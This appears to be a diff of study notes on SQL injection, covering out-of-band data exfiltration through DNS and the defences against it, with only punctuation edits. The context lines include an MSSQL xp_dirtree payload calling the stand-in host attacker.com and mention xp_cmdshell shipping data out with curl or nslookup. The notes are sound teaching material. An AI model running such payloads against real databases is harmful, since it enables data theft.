@@ -311,18 +311,18 @@ This builds a UNC path like `\\webapp_db.attacker.com\share`; on Windows-based M
 
 ### MSSQL techniques
 - **`xp_dirtree`** triggers a DNS lookup by trying to list a remote directory: `EXEC master..xp_dirtree '\\attacker.com\share';` : enabled by default, commonly usable.
-- **`xp_cmdshell`** (if enabled) runs OS commands directly, e.g. triggering `nslookup` or `curl` to ship data out — disabled by default in modern MSSQL.
+- **`xp_cmdshell`** (if enabled) runs OS commands directly, e.g., triggering `nslookup` or `curl` to ship data out — disabled by default in modern MSSQL.
 
 ### Receiving the data
 Something has to be listening for the callback:
 - **Burp Collaborator**: gives a unique subdomain, logs DNS/HTTP requests to it.
 - **Interactsh** (ProjectDiscovery): free, self-hostable equivalent.
-- **A custom listener**: e.g. a Python DNS server, for full control.
+- **A custom listener**: e.g., a Python DNS server, for full control.
 
 ### Limitations
 - Requires the database server to have outbound network access (often restricted in production).
 - Payloads are engine-specific (MySQL/MSSQL/PostgreSQL each differ).
-- DNS subdomain labels are capped at 63 characters which limits how much data one lookup can carry.
+- DNS subdomain labels are capped at 63 characters, which limits how much data one lookup can carry.
 - Generally slower and less reliable than direct extraction.
 
 **Q&A**
@@ -359,10 +359,10 @@ The database driver fills in the placeholder (`?` or `%s`) as a literal value, e
 **Definition**: prefixing SQL's special characters (`' " $ \`) with a backslash so the database engine treats them as literal text rather than syntax: e.g., `'` becomes `\'`. This is an older, weaker, database-engine-specific technique (different engines escape differently), best treated as a last resort for legacy code that can't easily be refactored to use prepared statements.
 
 ### Principle of Least Privilege
-**Definition**: a broader security principle stating that any account or process, including the database account a web application connects with, should be granted only the minimum permissions it actually needs. A read-only application's DB account should have `SELECT` only; applications should never connect as `root`/`sa`; sensitive tables should only be reachable by the specific processes that need them. This doesn't prevent SQLi, but it limits the damage if an injection does succeed — an attacker stuck with a low-privilege account can't drop tables or reach other databases.
+**Definition**: a broader security principle stating that any account or process, including the database account a web application connects with, should be granted only the minimum permissions it actually needs. A read-only application's DB account should have `SELECT` only; applications should never connect as `root`/`sa`; sensitive tables should only be reachable by the specific processes that need them. This doesn't prevent SQLi, but it limits the damage if an injection does succeed, an attacker stuck with a low-privilege account can't drop tables or reach other databases.
 
 ### Web Application Firewalls (WAFs)
-**Definition**: a security layer that inspects incoming HTTP requests and blocks known malicious patterns (`' OR 1=1`, `UNION SELECT`, `information_schema`, etc.) before they reach the application. Useful as an additional layer, but not a substitute for secure code — experienced attackers routinely bypass WAFs using encoding tricks, alternate syntax, or obfuscation.
+**Definition**: a security layer that inspects incoming HTTP requests and blocks known malicious patterns (`' OR 1=1`, `UNION SELECT`, `information_schema`, etc.) before they reach the application. Useful as an additional layer, but not a substitute for secure code. Experienced attackers routinely bypass WAFs using encoding tricks, alternate syntax, or obfuscation.
 
 **Q&A**
 - Name a method of protecting against SQLi: **Prepared statements**
